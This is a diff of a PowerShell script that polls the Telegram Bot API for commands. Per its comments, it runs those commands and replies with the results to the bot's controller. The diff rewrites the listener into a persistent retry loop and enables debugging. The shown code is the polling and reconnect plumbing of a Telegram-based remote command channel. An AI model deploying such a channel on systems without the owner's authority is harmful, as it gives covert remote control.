@@ -10,7 +10,7 @@ Add-type                -AssemblyName       System.Drawing          # Adds a Mic
 $tTOKEN                     = "@TOKEN"  # your API Token    (without the "@")
 $tID                        = "@ID"     # your Telegram ID  (without the "@")
 
-$ps_debug                   = $false
+$ps_debug                   = $true
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates'                  -f $tTOKEN
 $api_get_messages           = 'https://api.telegram.org/bot{0}/sendMessage'                 -f $tTOKEN
 $api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id='            -f $tTOKEN
@@ -40,7 +40,7 @@ function saveLocalLogs ($loglevel, $string)
             Write-Host "log" -BackgroundColor Black -ForegroundColor Red $Error[0]
         }
 
-        Start-Sleep -Milliseconds 50
+        Start-Sleep -Milliseconds 10
     }
 }
 
@@ -173,14 +173,9 @@ function commandListener
 # Once the command is executed, the result of the command will then be sent as a reply to the message to the controller of the Bot.
 # Attention! There is a timer that will be incremented to 100ms at a time to limit HTTPS requests to the Telegram API.
 {
-    if (-Not(Test-Path -Path $cache_file)) {
-        saveLocalLogs "log" "Create a cache file..."
-        Add-Content -Path $cache_file -Value "0" -Force
-    }
-
-    try {
-        saveLocalLogs "log" "Listening for commands..."
-        while (Invoke-RestMethod -Method Get "api.telegram.org") {
+    saveLocalLogs "log" "Listening for commands..."
+    while ($true) {
+        try {
             $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates           # Get the JSON response about the telegram updates
             $message    = $message.result.Message[-1]                                   # Get the last JSON record
             $message_id = $message.message_id                                           # Get the message_id of the update
@@ -265,24 +260,21 @@ function commandListener
             }
             
             Start-Sleep -Milliseconds $wait
+        } catch {
+            $err = $Error[0]
+            saveLocalLogs "err" $err
+            saveLocalLogs "log" "Waiting 5 seconds..."
+            Start-Sleep -Seconds 5
         }
-    } 
-    catch {
-        while ($true) {
-            try {
-                Test-NetConnection -ComputerName "api.telegram.org" -Port 80
-                break
-            }
-            catch {
-                saveLocalLogs "err" $Error[0]
-            }
-        }
-
-        Start-Sleep -Seconds 5
-
-        saveLocalLogs "log" "Restart the listener..."
-        commandListener
     }
+}
+
+
+
+saveLocalLogs "log" "Checking the cache file..."
+if (-Not(Test-Path -Path $cache_file)) {
+    saveLocalLogs "log" "Creating the cache file..."
+    Add-Content -Path $cache_file -Value "0" -Force
 }
 
 
